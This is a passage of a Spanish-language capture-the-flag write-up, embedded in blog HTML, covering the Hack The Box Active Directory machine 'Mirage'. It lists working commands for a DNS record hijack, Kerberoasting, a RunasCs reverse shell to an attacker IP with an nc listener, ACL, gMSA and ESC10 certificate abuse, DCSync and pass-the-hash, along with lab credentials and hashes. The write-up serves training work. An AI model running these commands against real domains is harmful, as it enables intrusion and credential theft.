2049/tcp6 status | 100024 1 2049/udp status |_ 100024 1 2049/udp6 status 135/tcp open msrpc Microsoft Windows RPC 139/tcp open netbios-ssn Microsoft Windows netbios-ssn 389/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: mirage.htb0., Site: Default-First-Site-Name) | ssl-cert: Subject: | Subject Alternative Name: DNS:dc01.mirage.htb, DNS:mirage.htb, DNS:MIRAGE | Not valid before: 2025-07-04T19:58:41 |_Not valid after: 2105-07-04T19:58:41 |_ssl-date: TLS randomness does not represent time 445/tcp open microsoft-ds? 464/tcp open kpasswd5? 593/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0 636/tcp open ssl/ldap Microsoft Windows Active Directory LDAP (Domain: mirage.htb0., Site: Default-First-Site-Name) |_ssl-date: TLS randomness does not represent time | ssl-cert: Subject: | Subject Alternative Name: DNS:dc01.mirage.htb, DNS:mirage.htb, DNS:MIRAGE | Not valid before: 2025-07-04T19:58:41 |_Not valid after: 2105-07-04T19:58:41 2049/tcp open nlockmgr 1-4 (RPC #100021) 3268/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: mirage.htb0., Site: Default-First-Site-Name) | ssl-cert: Subject: | Subject Alternative Name: DNS:dc01.mirage.htb, DNS:mirage.htb, DNS:MIRAGE | Not valid before: 2025-07-04T19:58:41 |_Not valid after: 2105-07-04T19:58:41 |_ssl-date: TLS randomness does not represent time 3269/tcp open ssl/ldap Microsoft Windows Active Directory LDAP (Domain: mirage.htb0., Site: Default-First-Site-Name) | ssl-cert: Subject: | Subject Alternative Name: DNS:dc01.mirage.htb, DNS:mirage.htb, DNS:MIRAGE | Not valid before: 2025-07-04T19:58:41 |_Not valid after: 2105-07-04T19:58:41 |_ssl-date: TLS randomness does not represent time 4222/tcp open vrml-multi-use? | fingerprint-strings: | GenericLines: | INFO {\"server_id\":\"NCMWHQIQRFB4QMO76ITZFJ6QXHBQ5II57L6M4X2UA7GZ23H6BFSXI26M\",\"server_name\":\"NCMWHQIQRFB4QMO76ITZFJ6QXHBQ5II57L6M4X2UA7GZ23H6BFSXI26M\",\"version\":\"2.11.3\",\"proto\":1,\"git_commit\":\"a82cfda\",\"go\":\"go1.24.2\",\"host\":\"0.0.0.0\",\"port\":4222,\"headers\":true,\"auth_required\":true,\"max_payload\":1048576,\"jetstream\":true,\"client_id\":2714,\"client_ip\":\"10.10.15.254\",\"xkey\":\"XC3AIA5LH4FAOYEAWEY2G32CA7M7L6DNRRGFQKDEO2OHKWSGBQIAUCKL\"} | -ERR 'Authorization Violation' | GetRequest: | INFO {\"server_id\":\"NCMWHQIQRFB4QMO76ITZFJ6QXHBQ5II57L6M4X2UA7GZ23H6BFSXI26M\",\"server_name\":\"NCMWHQIQRFB4QMO76ITZFJ6QXHBQ5II57L6M4X2UA7GZ23H6BFSXI26M\",\"version\":\"2.11.3\",\"proto\":1,\"git_commit\":\"a82cfda\",\"go\":\"go1.24.2\",\"host\":\"0.0.0.0\",\"port\":4222,\"headers\":true,\"auth_required\":true,\"max_payload\":1048576,\"jetstream\":true,\"client_id\":2715,\"client_ip\":\"10.10.15.254\",\"xkey\":\"XC3AIA5LH4FAOYEAWEY2G32CA7M7L6DNRRGFQKDEO2OHKWSGBQIAUCKL\"} | -ERR 'Authorization Violation' | HTTPOptions: | INFO {\"server_id\":\"NCMWHQIQRFB4QMO76ITZFJ6QXHBQ5II57L6M4X2UA7GZ23H6BFSXI26M\",\"server_name\":\"NCMWHQIQRFB4QMO76ITZFJ6QXHBQ5II57L6M4X2UA7GZ23H6BFSXI26M\",\"version\":\"2.11.3\",\"proto\":1,\"git_commit\":\"a82cfda\",\"go\":\"go1.24.2\",\"host\":\"0.0.0.0\",\"port\":4222,\"headers\":true,\"auth_required\":true,\"max_payload\":1048576,\"jetstream\":true,\"client_id\":2716,\"client_ip\":\"10.10.15.254\",\"xkey\":\"XC3AIA5LH4FAOYEAWEY2G32CA7M7L6DNRRGFQKDEO2OHKWSGBQIAUCKL\"} | -ERR 'Authorization Violation' | NULL: | INFO {\"server_id\":\"NCMWHQIQRFB4QMO76ITZFJ6QXHBQ5II57L6M4X2UA7GZ23H6BFSXI26M\",\"server_name\":\"NCMWHQIQRFB4QMO76ITZFJ6QXHBQ5II57L6M4X2UA7GZ23H6BFSXI26M\",\"version\":\"2.11.3\",\"proto\":1,\"git_commit\":\"a82cfda\",\"go\":\"go1.24.2\",\"host\":\"0.0.0.0\",\"port\":4222,\"headers\":true,\"auth_required\":true,\"max_payload\":1048576,\"jetstream\":true,\"client_id\":2713,\"client_ip\":\"10.10.15.254\",\"xkey\":\"XC3AIA5LH4FAOYEAWEY2G32CA7M7L6DNRRGFQKDEO2OHKWSGBQIAUCKL\"} |_ -ERR 'Authentication Timeout' 5985/tcp open http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP) |_http-title: Not Found |_http-server-header: Microsoft-HTTPAPI/2.0 9389/tcp open mc-nmf .NET Message Framing 47001/tcp open http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP) |_http-server-header: Microsoft-HTTPAPI/2.0 |_http-title: Not Found 49664/tcp open msrpc Microsoft Windows RPC 49665/tcp open msrpc Microsoft Windows RPC 49666/tcp open msrpc Microsoft Windows RPC 49667/tcp open msrpc Microsoft Windows RPC 49669/tcp open msrpc Microsoft Windows RPC 51856/tcp open msrpc Microsoft Windows RPC 51863/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0 51864/tcp open msrpc Microsoft Windows RPC 51879/tcp open msrpc Microsoft Windows RPC 51885/tcp open msrpc Microsoft Windows RPC 51913/tcp open msrpc Microsoft Windows RPC 51920/tcp open msrpc Microsoft Windows RPC 57944/tcp open msrpc Microsoft Windows RPC 2 services unrecognized despite returning data. If you know the service/version, please submit the following fingerprints at https://nmap.org/cgi-bin/submit.cgi?new-service : ==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)============== SF-Port53-TCP:V=7.97%I=7%D=7/21%Time=687E540E%P=x86_64-pc-linux-gnu%r(DNS- SF:SD-TCP,30,\"\\0\\.\\0\\0\\x80\\x82\\0\\x01\\0\\0\\0\\0\\0\\0\\t_services\\x07_dns-sd\\x04 SF:_udp\\x05local\\0\\0\\x0c\\0\\x01\"); ==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)============== SF-Port4222-TCP:V=7.97%I=7%D=7/21%Time=687E53FB%P=x86_64-pc-linux-gnu%r(NU SF:LL,1D2,\"INFO\\x20{\\\"server_id\\\":\\\"NCMWHQIQRFB4QMO76ITZFJ6QXHBQ5II57L6M4X SF:2UA7GZ23H6BFSXI26M\\\",\\\"server_name\\\":\\\"NCMWHQIQRFB4QMO76ITZFJ6QXHBQ5II5 SF:7L6M4X2UA7GZ23H6BFSXI26M\\\",\\\"version\\\":\\\"2\\.11\\.3\\\",\\\"proto\\\":1,\\\"git_c SF:ommit\\\":\\\"a82cfda\\\",\\\"go\\\":\\\"go1\\.24\\.2\\\",\\\"host\\\":\\\"0\\.0\\.0\\.0\\\",\\\"por SF:t\\\":4222,\\\"headers\\\":true,\\\"auth_required\\\":true,\\\"max_payload\\\":104857 SF:6,\\\"jetstream\\\":true,\\\"client_id\\\":2713,\\\"client_ip\\\":\\\"10\\.10\\.15\\.254 SF:\\\",\\\"xkey\\\":\\\"XC3AIA5LH4FAOYEAWEY2G32CA7M7L6DNRRGFQKDEO2OHKWSGBQIAUCKL\\ SF:\"}\\x20\\r\\n-ERR\\x20'Authentication\\x20Timeout'\\r\\n\")%r(GenericLines,1D3, SF:\"INFO\\x20{\\\"server_id\\\":\\\"NCMWHQIQRFB4QMO76ITZFJ6QXHBQ5II57L6M4X2UA7GZ2 SF:3H6BFSXI26M\\\",\\\"server_name\\\":\\\"NCMWHQIQRFB4QMO76ITZFJ6QXHBQ5II57L6M4X2 SF:UA7GZ23H6BFSXI26M\\\",\\\"version\\\":\\\"2\\.11\\.3\\\",\\\"proto\\\":1,\\\"git_commit\\\" SF::\\\"a82cfda\\\",\\\"go\\\":\\\"go1\\.24\\.2\\\",\\\"host\\\":\\\"0\\.0\\.0\\.0\\\",\\\"port\\\":422 SF:2,\\\"headers\\\":true,\\\"auth_required\\\":true,\\\"max_payload\\\":1048576,\\\"jet SF:stream\\\":true,\\\"client_id\\\":2714,\\\"client_ip\\\":\\\"10\\.10\\.15\\.254\\\",\\\"xk SF:ey\\\":\\\"XC3AIA5LH4FAOYEAWEY2G32CA7M7L6DNRRGFQKDEO2OHKWSGBQIAUCKL\\\"}\\x20\\ SF:r\\n-ERR\\x20'Authorization\\x20Violation'\\r\\n\")%r(GetRequest,1D3,\"INFO\\x2 SF:0{\\\"server_id\\\":\\\"NCMWHQIQRFB4QMO76ITZFJ6QXHBQ5II57L6M4X2UA7GZ23H6BFSXI SF:26M\\\",\\\"server_name\\\":\\\"NCMWHQIQRFB4QMO76ITZFJ6QXHBQ5II57L6M4X2UA7GZ23H SF:6BFSXI26M\\\",\\\"version\\\":\\\"2\\.11\\.3\\\",\\\"proto\\\":1,\\\"git_commit\\\":\\\"a82cf SF:da\\\",\\\"go\\\":\\\"go1\\.24\\.2\\\",\\\"host\\\":\\\"0\\.0\\.0\\.0\\\",\\\"port\\\":4222,\\\"head SF:ers\\\":true,\\\"auth_required\\\":true,\\\"max_payload\\\":1048576,\\\"jetstream\\\" SF::true,\\\"client_id\\\":2715,\\\"client_ip\\\":\\\"10\\.10\\.15\\.254\\\",\\\"xkey\\\":\\\"X SF:C3AIA5LH4FAOYEAWEY2G32CA7M7L6DNRRGFQKDEO2OHKWSGBQIAUCKL\\\"}\\x20\\r\\n-ERR\\ SF:x20'Authorization\\x20Violation'\\r\\n\")%r(HTTPOptions,1D3,\"INFO\\x20{\\\"ser SF:ver_id\\\":\\\"NCMWHQIQRFB4QMO76ITZFJ6QXHBQ5II57L6M4X2UA7GZ23H6BFSXI26M\\\",\\ SF:\"server_name\\\":\\\"NCMWHQIQRFB4QMO76ITZFJ6QXHBQ5II57L6M4X2UA7GZ23H6BFSXI2 SF:6M\\\",\\\"version\\\":\\\"2\\.11\\.3\\\",\\\"proto\\\":1,\\\"git_commit\\\":\\\"a82cfda\\\",\\\" SF:go\\\":\\\"go1\\.24\\.2\\\",\\\"host\\\":\\\"0\\.0\\.0\\.0\\\",\\\"port\\\":4222,\\\"headers\\\":t SF:rue,\\\"auth_required\\\":true,\\\"max_payload\\\":1048576,\\\"jetstream\\\":true,\\ SF:\"client_id\\\":2716,\\\"client_ip\\\":\\\"10\\.10\\.15\\.254\\\",\\\"xkey\\\":\\\"XC3AIA5L SF:H4FAOYEAWEY2G32CA7M7L6DNRRGFQKDEO2OHKWSGBQIAUCKL\\\"}\\x20\\r\\n-ERR\\x20'Aut SF:horization\\x20Violation'\\r\\n\"); Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows Host script results: | smb2-time: | date: 2025-07-21T21:52:27 |_ start_date: N/A |_clock-skew: 6h59m47s | smb2-security-mode: | 3.1.1: |_ Message signing enabled and required Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 93.54 seconds NFS Misconfig Vemos que el dominio tiene el puerto 111 (NFS) abierto y como no tenemos nada más por donde tirar, vamos ver que contiene, y en el caso de que podamos y haya algún tipo de archivo, descargarnos-lo.\nshowmount -e 10.10.11.78 mkdir MirageReports sudo mount -t nfs 10.10.11.78:/ ./MirageReports -o nolock Vemos que tenemos dos pdf que parecen interesantes, con lo cual nos los descargamos a la máquina y desmontamos el NFS.\nsudo umount MirageReports Y ahora como el archivo lo he sacado como root le asigno de propietario a mi usuario normal para trabajar más cómodamente.\nsudo chown borhub:borhub Incident_Report_Missing_DNS_Record_nats-svc.pdf Mirage_Authentication_Hardening_Report.pdf Authenticación_Hardening_Report Este pdf viene por parte del equipo de seguridad de AD, en el que indican que la autenticación NTLM esta siendo desactivada de todos los dispositivos y aplicaciones que usan esta autenticación para sustituirla por Kerberos.\nReport_Missing_DNS_Record_nats_svc Este siguiente reporte, proviene del equipo de infraestructura de la red. Y en el se comenta que habían tenido problemas con el hostname nats-svc.mirage.htb ya que había sido eliminado automáticamente porque el registro no había sido actualizado en un plazo de 14 días. Hasta este momento nosotros no sabíamos sobre la existencia de esta dirección, y se comenta que este hostname es crítico para el sistema interno de comunicación con el sistema de mensajería del sistema NATS alojado en el dominio Mirage.\nDescubrimos nueva dirección hostname que ha sido eliminada : nats-svc.mirage.htb. Se usa como sistema de mensajería interna NATS. También al final del pdf, encontramos que puntualizan un posible vector de ataque:\nEn entornos de desarrollo, los nombres de servicio fijos, como nats-svc.mirage.htb, a menudo se codifican de forma rígida en las aplicaciones.\nSi falta el registro DNS, algunas aplicaciones pueden seguir intentando conectarse a ese nombre. Este comportamiento podría ser objeto de abuso por parte de los atacantes si se secuestran los registros DNS.\nEntonces, para ponernos en contexto tenemos los siguientes puntos clave:\nRegistro nats-svc ha sido removido del servidor.\nPosiblemente quede algún servició que aún siga resolviendo a hostname para autenticarse.\nDynamic DNS Updates Windows Server permite (por diseño) que ciertos hosts hagan “Dynamic DNS Updates” para registrar registros tipo A sin credenciales si se cumplen ciertas condiciones.\nMuchos controladores de dominio permiten por defecto que:\nCualquier máquina unida al dominio pueda registrar un nombre nuevo (en el caso de que no exista).\nA veces, incluso hosts que no están unidos al dominio pueden registrar nombres si no están en uso, gracias a cómo está configurado el servidor DNS (con actualizaciones dinámicas habilitadas).\nEntonces ahora que ya tenemos el vector de ataque identificado, vamos a usar la herramienta nsupdate para enviar una petición DNS dinámica al DC y crear un registro A.\nCreamos un archivo llamado update.txt en que vamos a añadir las instrucciones que le lanzaremos al DC:\n❯ cat update.txt server 10.10.11.78 update add nats-svc.mirage.htb. 3600 A 10.10.14.51 send Luego lanzamos el comando con el archivo .txt, en la salida haciendo uso de -d vemos que se envia la actualización a la ip 10.10.11.78 y que nos devuelve la query con un UPDATE:1.\nnsupdate -v -d update.txt Al parecer el comando ha funcionado pero lo comprobamos con dig y con nslookup.\ndig @10.10.11.78 nats-svc.mirage.htb A +short ❯ nslookup \u003e server 10.10.11.78 Default server: 10.10.11.78 Address: 10.10.11.78#53 \u003e nats-svc.mirage.htb Server:\t10.10.11.78 Address:\t10.10.11.78#53 Name:\tnats-svc.mirage.htb Address: 10.10.14.51 \u003e Ahora con las comprobaciones solo nos queda recibir las peticiones haciendo uso de un script simulando un servidor nats:\nCONNECT {\"verbose\":false,\"pedantic\":false,\"user\":\"Dev_Account_A\",\"pass\":\"hx5h7F5554fP@1337!\",\"tls_required\":false,\"name\":\"NATS CLI Version 0.2.2\",\"lang\":\"go\",\"version\":\"1.41.1\",\"protocol\":1,\"echo\":true,\"headers\":false,\"no_responders\":false} Nats Enumeration Nats es un sistema de mensajería de código abierto.\nPrimero añadimos un contexto con la url del servidor y las credenciales.\nnats context add nats-serv --server nats://dc01.mirage.htb:4222 --user Dev_Account_A --password 'hx5h7F5554fP@1337!' --selectV Veo un stream llamado auth_logs\nnats stream ls Con lo cual voy a hacer un nuevo consumer en el stream auth_logs para tratar de leer los mensajes.\nnats consumer add auth_logs myreader --deliver all --ack explicit nats consumer next auth_logs myreader --count=5 Vemos que tenemos al parecer unas credenciales de david.jjackson:“pN8kQmn6b86!1234@”. Con lo cual las vamos a comprobar con nxc.\nsudo ntpdate -u 10.10.11.78 nxc ldap mirage.htb -u david.jjackson -p 'pN8kQmn6b86!1234@' -k Bloodhound Enumeration Anteriormente habíamos visto que la autenticación NTLM estaba descativada, con lo cual vamos a sacar un TGT (Ticket Garanting Ticket) para el usuario david.jjackson.\ngetTGT.py mirage.htb/david.jjackson:'pN8kQmn6b86!1234@' -dc-ip 10.10.11.78 export KRB5CCNAME=/home/borhub/Workspace/HTB/Mirage/EXPLOITS/david.jjackson.ccache Una vez con el ticket obtenido, ya lanzamos el escaneo con bloodhound-python.\nbloodhound-python -u 'david.jjackson' -k -no-pass -d MIRAGE.HTB -ns 10.10.11.78 -dc DC01.mirage.htb -c all --zip --auth-method kerberos Mirando el bloodhound no veo nada interesante en cuanto a los permisos del usuario david.jjackson, con lo cual pruebo a lanzar un ataque kerberoast para ver si recibimos algún hash kerbero.\nAtaque Kerbereoast /opt/Herramientas/targetedKerberoast/targetedKerberoast.py --dc-ip 10.10.11.78 --dc-host DC01.mirage.htb -d 'MIRAGE.HTB' -u 'david.jjackson' --no-pass -k Y ahora vamos a probar a craquear el TGS (Ticket Garantig Service) con hashcat.\nhashcat -m 13100 --force -a 0 hash_kerbero /usr/share/SecLists/Passwords/Leaked-Databases/rockyou.txt --force -O nathan.aadam:'3edc#EDC3' Shell as nathan.aadam Pedimos otro TGT para el usuario nathan.aadam.\ngetTGT.py mirage.htb/nathan.aadam:'3edc#EDC3' -dc-ip 10.10.11.78 export KRB5CCNAME=/home/borhub/workspace/HTB/Mirage/CONTENT/nathan.aadam.ccache Ahora con evil-winrm vamos a ganarnos una shell como el usuario nathan.\nMiramos los permisos en bloodhound y vemos que es miembro de varios grupos, pero no tiene ningún permiso sobre otros usuarios. Con lo cual voy a subir un winPEAS para realizar un escaneo al sistema.\nWinPeas Enum - AutoLogon Credentials Mirando el resultado, veo que hay unas credenciales en el AutoLogon:\nmark.bbond:1day@atime Ahora comprobamos las credenciales con nxc:\nnxc ldap mirage.htb -u mark.bbond -p '1day@atime' -k Y Pedimos un TGT para el usuario mark.bbond:\ngetTGT.py mirage.htb/mark.bbond:'1day@atime' -dc-ip 10.10.11.78 export KRB5CCNAME=/home/borhub/Workspace/HTB/Mirage/CONTENT/mark.bbond.ccache As mark.bbond Abusando de permisos ForceChangePassword - BloodyAD Mirando los permisos sobre otros usuarios de mark.bbond vemos que tiene permisos ForceChangePassword sobre javier.mmarshall.\nEntonces lo primero que realizamos es cambiar la contraseña del ususario:\nbloodyAD --host DC01.mirage.htb -d mirage.htb -k -u 'mark.bbond' -p '1day@atime' set password 'javier.mmarshall' 'Password!' Deshabilitar ACCOUNTDISABLED - BloodyAD Ahora, nos hemos encontrado con que este usuario esta desactivado con lo cual vamos a activarlo.7\nbloodyAD --host DC01.mirage.htb -d mirage.htb -k -u 'mark.bbond' -p '1day@atime' remove uac 'javier.mmarshall' -f ACCOUNTDISABLE Pero ahora si intentamos obtener un tgt o comprobar las credenciales con nxc, recibimos el error KDC_ERR_CLIENT_REVOKED.\nRestricción LogonHours del usuario javier.mmarshall Con bloodyAD vamos a revisar que tenemos la restricción de logonHours, ademas vemos que no hay ninguna hora en la que podamos loggearnos.\nbloodyAD --host DC01.mirage.htb -d mirage.htb -k -u 'mark.bbond' -p '1day@atime' get object javier.mmarshall --attr logonHours Ahora, para poder cambiar esta restricción vamos a tener que abrirnos una rev shell con RunasCs con el usuario mark.bbond.\n.\\RunasCs.exe mark.bbond '1day@atime' powershell -r 10.10.14.51:4444 nc -lvnp 4444 Si volvemos a mirar el objeto logonHours en powershell, vemos que nos sale todo 0. Esto nos indica que no tiene ninguna hora configurada para poder iniciar sesión.\nGet-ADUser -Identity javier.mmarshall -Properties logonHours | Select-Object -ExpandProperty logonHours Ahora vamos a limpiar ese registro del logonHours para que nos deje iniciar sesión siempre. Cuando volvemos a mirar las propiedades de logonHours con Get-ADUsers ja no nos sale nada.\nSet-ADUser -Identity javier.mmarshall -Clear logonHours Get-ADUser -Identity javier.mmarshall -Properties logonHours | Select-Object -ExpandProperty logonHours Una vez hecho esto, comprobamos las credenciales con nxc:\nnxc ldap mirage.htb -u javier.mmarshall -p 'Password!' -k As javier.mmarshall Abusando de permisos ReadGMSAPassword - Nxc Ahora con el usuario javier.mmarshall bajo nuestro control podemos leer la contraseña GMSA del equipo sobre el cual tenemos los permisos ReadGMSAPassword.\nnxc ldap mirage.htb -u javier.mmarshall -p 'Password!' -k --gmsa Account: Mirage-Service$ NTLM: 305806d84f7c1be93a07aaf40f0c7866 PrincipalsAllowedToReadPassword: javier.mmarshall Comprobamos con nxc y vemos que nos autenticamos sin ningún problema.\nnxc ldap mirage.htb -u Mirage-Service$ -H '305806d84f7c1be93a07aaf40f0c7866' -k Sacamos el tgt:\ngetTGT.py mirage.htb/Mirage-Service$ -hashes aad3b435b51404eeaad3b435b51404ee:305806d84f7c1be93a07aaf40f0c7866 -dc-ip 10.10.11.78 Escalada de privilegios Abusando de ESC2 y ESC3 - Certipy (FAILED) Probando diferentes cosas, me pongo a buscar posibles configuraciones inseguras en AD CS con certipy find.\nEn un principio pruebo el siguiente comando pero no me sacaba ninguna plantilla vulnerable, ya que a veces con el parámetro -vulnerable, certipy no es capaz de enumerar las plantillas.\ncertipy find -k -dc-host DC01.mirage.htb -vulnerable -stdout Entonces, quitamos el parámetro -vulnerable y nos sale que se han detectado dos plantillas vulnerables ESC2 y ESC3.\ncertipy find -k -dc-host DC01.mirage.htb -stdout [ESC2: Any Purpose Certificate Template](certipy find -k -dc-host DC01.mirage.htb -stdout)\nLas explotaciones ESC2 incluyen dos componentes clave de los cuales fijarse para comprobar que la plantilla sea realmente vulnerable:\nObtener un certificado para AnyPurpose: La primera plantilla contiene la flag “AnyPurpose” definida. Una plantilla que permita Enrollment Rights: Una segunda plantilla de certificados que permita a usuarios poco privilegiados como (Domain Users) permisos que permita el enrolamiento de agentes. Si miramos como identificar con certipy que la plantilla es vulnerable, nos tenemos que fijar en que la flag AnyPurpose sea igual a True.\nEn nuestro caso, si nos fijamos vemos que tenemos la flag AnyPurpose: False. Y no tenemos ningún indicador de plantillas miss configuradas como: [!] Vulnerabilities ESC2 : Template can be used for any purpose. o [!] Vulnerabilities ESC3 : Template has Certificate Request Agent EKU set.\nSi miramos que componentes necesitamos para la explotación de ESC3, vemos lo siguiente:\nNecesitamos una plantilla de certificados que permita el enrolamiento de agentes. Pero si miramos ambas plantillas vulnerables, vemos que ambas tienen el Enrollment Agent: False. Aun así he intentado a llevar a cabo la explotación de la vulnerabilidad ESC2 y ESC3 pero no ha sido posible. Con lo cual posiblemente estemos frente a un falso positivo que a veces ocurre con certipy.\nESC10: Weak Certificate Mapping for Schannel Authentication ESC10: Weak Certificate Mapping for Schannel Authentication\nPrimero leemos el upn del usuario victima (por si tenemos que restaurarlo luego):\ncertipy account -k -dc-host DC01.mirage.htb -user mark.bbond read Despues actualizamos el upn del usuario victima al DC objetivo. (Necesitamos usas las credenciales de Mirage-Service para tener permisos para cambiar los atributos de mark.bbond)\nexport KRB5CCNAME=/home/borhub/Workspace/HTB/Mirage/CONTENT/Mirage-Service\\$.ccache certipy account -k -dc-host DC01.mirage.htb -upn 'DC01$@mirage.htb' -user mark.bbond update Si ya tenemos un TGT como el usuario mark.bbond, debemos renovarlo ya que no tendra el UPN correspondiente.\nUna vez con el upn del usuario victima como “DC01@mirage.htb”, exportamos a la variable KRB5CCNAME el archivo .ccache de mark.bbond. Una vez hecho esto, solicitamos un certificado de autenticación del cliente como el usuario “mark.bbond”. Que nos devolverá un certificado como dc.pfx.\ncertipy req -k -dc-host DC01.mirage.htb -ca mirage-DC01-CA -template User Ahora, con el certificado revertimos el upn del usuario victima para que no haya conflictos a la hora de usar el certificado.\ncertipy account -k -dc-host DC01.mirage.htb -upn 'mark.bbond@mirage.htb' -user mark.bbond update Y finalmente probamos a autenticar-nos con la opción auth como el DC haciendo uso de LDAPS.\ncertipy auth -pfx 'dc01.pfx' -dc-ip '10.10.11.78' -ldap-shell Ahora si miramos la lista de comandos que tenemos, veo que hay varias opciones para conseguir acceso total como administrador.\nPrimero intento usar la opción dump para extraer usuarios, contraseñas LAPS etc. pero veo que no esta implementado:\nOtorgando Resource-Based Constrained Delegation a Mirage-Service Entonces pruebo a otorgar una delegación controlada bajo mi control en el DC. Para así impersonar al equipo DC01.\nVulevo a renovar el TGT de Mirage-Service y con getST.py solicitamos un ticket cifs para el equipo DC01.\ngetST.py -impersonate 'DC01$' -spn 'cifs/DC01.mirage.htb' -dc-ip 10.10.11.78 'mirage.htb/Mirage-Service$' -k -no-pass DCSYNC Attack - Secretdumps.py Ahora vamos a probar con secretdumps.py a realizar el ataque DSYNC Atack que nos permite extraer los hashes de todos los usuarios del dominio.\nsecretsdump.py -k -no-pass 'mirage.htb/dc01$@dc01.mirage.htb' Ahora que tenemos el hash de administrator, solicitamos un Ticket Garanting Ticket (TGT) y nos autenticamos con el a través de evil-winrm para obtener acceso como Domain Admin.\n​\ngetTGT.py mirage.htb/Administrator -hashes aad3b435b51404eeaad3b435b51404ee:7be6d4f3c2b9c0e3560f5a29eeb1afb3 -dc-ip 10.10.11.78 export KRB5CCNAME=/home/borhub/Workspace/HTB/Mirage/CONTENT/Administrator.ccache evil-winrm -i DC01.mirage.htb -r mirage.htb ",
+  "wordCount" : "3149",
+  "inLanguage": "en",
+  "image":"https://borhuub.github.io/logo_machines/mirage.png","datePublished": "0001-01-01T00:00:00Z",
+  "dateModified": "0001-01-01T00:00:00Z",
+  "author":{
+    "@type": "Person",
+    "name": "Borhub"
+  },
+  "mainEntityOfPage": {
+    "@type": "WebPage",
+    "@id": "https://borhuub.github.io/writeups/mirage/"
+  },
+  "publisher": {
+    "@type": "Organization",
+    "name": "Borhub Blog",
+    "logo": {
+      "@type": "ImageObject",
+      "url": "https://borhuub.github.io/%3Clink%20/%20abs%20url%3E"
+    }
+  }
+}
+</script>
+</head>
+<body id="top">
+    <header class="header">
+    <nav class="nav">
+        <div class="logo">
+            <a href="https://borhuub.github.io/" accesskey="h" title="Home (Alt + H)">
+                <img src="https://borhuub.github.io/apple-touch-icon.png" alt="" aria-label="logo"
+                    height="35">Home</a>
+            <div class="logo-switches">
+                <button id="theme-toggle" accesskey="t" title="(Alt + T)" aria-label="Toggle theme">
+                    <svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path>
+                    </svg>
+                    <svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <circle cx="12" cy="12" r="5"></circle>
+                        <line x1="12" y1="1" x2="12" y2="3"></line>
+                        <line x1="12" y1="21" x2="12" y2="23"></line>
+                        <line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line>
+                        <line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line>
+                        <line x1="1" y1="12" x2="3" y2="12"></line>
+                        <line x1="21" y1="12" x2="23" y2="12"></line>
+                        <line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line>
+                        <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
+                    </svg>
+                </button>
+            </div>
+        </div>
+        <ul id="menu">
+            <li>
+                <a href="https://borhuub.github.io/writeups/" title="Writeups">
+                    <span>Writeups</span>
+                </a>
+            </li>
+            <li>
+                <a href="https://borhuub.github.io/tags/" title="Tags">
+                    <span>Tags</span>
+                </a>
+            </li>
+            <li>
+                <a href="https://borhuub.github.io/certs/" title="Certifications">
+                    <span>Certifications</span>
+                </a>
+            </li>
+        </ul>
+    </nav>
+</header>
+<main class="main">
+
+<article class="post-single">
+  <header class="post-header">
+    <div class="breadcrumbs"><a href="https://borhuub.github.io/">Home</a>&nbsp;»&nbsp;<a href="https://borhuub.github.io/writeups/">Writeups</a></div>
+    <h1 class="post-title entry-hint-parent">
+      Mirage
+    </h1>
+    <div class="post-meta"><span>15 min</span>&nbsp;·&nbsp;<span>3149 words</span>&nbsp;·&nbsp;<span>Borhub</span>
+
+</div>
+  </header> <div class="toc">
+    <details >
+        <summary accesskey="c" title="(Alt + C)">
+            <span class="details">Table of Contents</span>
+        </summary>
+
+        <div class="inner"><ul>
+                <li>
+                    <a href="#reconocimiento" aria-label="Reconocimiento">Reconocimiento</a></li>
+                <li>
+                    <a href="#nfs-misconfig" aria-label="NFS Misconfig">NFS Misconfig</a><ul>
+                        
+                <li>
+                    <a href="#authenticaci%c3%b3n_hardening_report" aria-label="Authenticación_Hardening_Report">Authenticación_Hardening_Report</a></li>
+                <li>
+                    <a href="#report_missing_dns_record_nats_svc" aria-label="Report_Missing_DNS_Record_nats_svc">Report_Missing_DNS_Record_nats_svc</a></li></ul>
+                </li>
+                <li>
+                    <a href="#dynamic-dns-updates" aria-label="Dynamic DNS Updates">Dynamic DNS Updates</a><ul>
+                        
+                <li>
+                    <a href="#nats-enumeration" aria-label="Nats Enumeration">Nats Enumeration</a></li></ul>
+                </li>
+                <li>
+                    <a href="#bloodhound-enumeration" aria-label="Bloodhound Enumeration">Bloodhound Enumeration</a><ul>
+                        
+                <li>
+                    <a href="#ataque-kerbereoast" aria-label="Ataque Kerbereoast">Ataque Kerbereoast</a></li></ul>
+                </li>
+                <li>
+                    <a href="#shell-as-nathanaadam" aria-label="Shell as nathan.aadam">Shell as nathan.aadam</a><ul>
+                        
+                <li>
+                    <a href="#winpeas-enum---autologon-credentials" aria-label="WinPeas Enum - AutoLogon Credentials">WinPeas Enum - AutoLogon Credentials</a></li></ul>
+                </li>
+                <li>
+                    <a href="#as-markbbond" aria-label="As mark.bbond">As mark.bbond</a><ul>
+                        
+                <li>
+                    <a href="#abusando-de-permisos-forcechangepassword---bloodyad" aria-label="Abusando de permisos ForceChangePassword - BloodyAD">Abusando de permisos ForceChangePassword - BloodyAD</a></li>
+                <li>
+                    <a href="#deshabilitar-accountdisabled---bloodyad" aria-label="Deshabilitar ACCOUNTDISABLED - BloodyAD">Deshabilitar ACCOUNTDISABLED - BloodyAD</a></li>
+                <li>
